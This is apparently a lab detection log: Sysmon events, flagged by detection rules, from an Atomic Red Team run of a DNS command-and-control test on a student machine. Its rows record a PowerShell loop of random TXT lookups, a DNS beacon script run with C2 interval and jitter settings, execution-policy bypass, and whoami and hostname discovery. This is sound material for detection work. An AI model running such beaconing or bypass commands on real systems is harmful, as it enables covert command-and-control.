"2025-12-22 13:59:14.213 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166316,"Query: atomicredteam-682588.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.351","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.214 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166317,"Query: atomicredteam-255121.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.394","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.214 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166318,"Query: atomicredteam-82650.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.437","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.214 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166319,"Query: atomicredteam-121549.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.214 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166320,"Query: atomicredteam-879501.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.523","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.215 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166321,"Query: atomicredteam-255265.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.566","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:14.215 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166322,"Query: atomicredteam-643513.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.886","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.215 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166323,"Query: atomicredteam-45548.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:13.929","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.215 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166324,"Query: atomicredteam-235694.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.111","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.215 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166325,"Query: atomicredteam-419377.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.155","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.216 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166326,"Query: atomicredteam-825734.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.199","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.216 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166327,"Query: atomicredteam-528484.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.242","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.216 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166328,"Query: atomicredteam-246045.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.285","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.216 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166329,"Query: atomicredteam-766783.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.329","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.217 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166330,"Query: atomicredteam-235489.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.373","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.217 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166331,"Query: atomicredteam-311209.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.416","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.217 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166332,"Query: atomicredteam-135342.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.458","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.217 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166333,"Query: atomicredteam-854918.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.502","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.218 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166334,"Query: atomicredteam-338525.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.822","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.218 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166335,"Query: atomicredteam-595690.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:14.863","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.218 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166336,"Query: atomicredteam-6020.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.044","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:15.218 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166337,"Query: atomicredteam-429768.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.088","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.223 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166338,"Query: atomicredteam-860006.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.203","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.223 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166339,"Query: atomicredteam-692205.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.249","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.224 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166340,"Query: atomicredteam-659703.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.291","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.224 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166341,"Query: atomicredteam-913526.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.224 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166342,"Query: atomicredteam-556482.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:15.377","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:54.233 +01:00","Suspicious Execution of Hostname","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",165344,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 4272 ¦ PGUID: E9F06A57-4052-6949-5105-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:57:54.229","proc_creation_win_hostname_execution.yml","cd4f18d8-b261-1a76-2600-f039cd6f0310","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:54.549 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",165346,"Cmdline: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \""""TXT\"""" \""""atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\"""" -QuickTimeout}} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:57:54.528","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:54.270 +01:00","Local Accounts Discovery","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1033 ¦ T1087.001","sysmon",165345,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 4612 ¦ PGUID: E9F06A57-4052-6949-5205-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:57:54.262","proc_creation_win_susp_local_system_owner_account_discovery.yml","e149ce89-80e1-9461-ab1f-2c14cabd84c0","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:17.119 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166348,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_1ytt24h1.s41.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100","CreationUtcTime: 2025-12-22 12:59:17.106 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:17.106","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:17.693 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166357,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_ob3mngdx.bzw.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","CreationUtcTime: 2025-12-22 13:01:17.683 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:17.683","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.689 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166584,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_jljuv4ky.yvh.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:37.685 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:37.687","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:40.512 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166587,"Path: C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:40.482 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:40.482","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.050 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166594,"Path: C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:42.001 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:42.001","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:40.481 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166586,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.dll ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:40.479 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:40.479","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:41.775 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166592,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.dll ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ PID: 10380 ¦ PGUID: E9F06A57-4134-6949-5C05-000000002100","CreationUtcTime: 2025-12-22 13:01:40.479 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:41.774","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.050 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166593,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.dll ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","CreationUtcTime: 2025-12-22 13:01:42.001 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:42.001","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.201 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",166597,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.dll ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ PID: 3096 ¦ PGUID: E9F06A57-4136-6949-5E05-000000002100","CreationUtcTime: 2025-12-22 13:01:42.001 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:42.199","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.973 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",166347,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:59:16.892","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
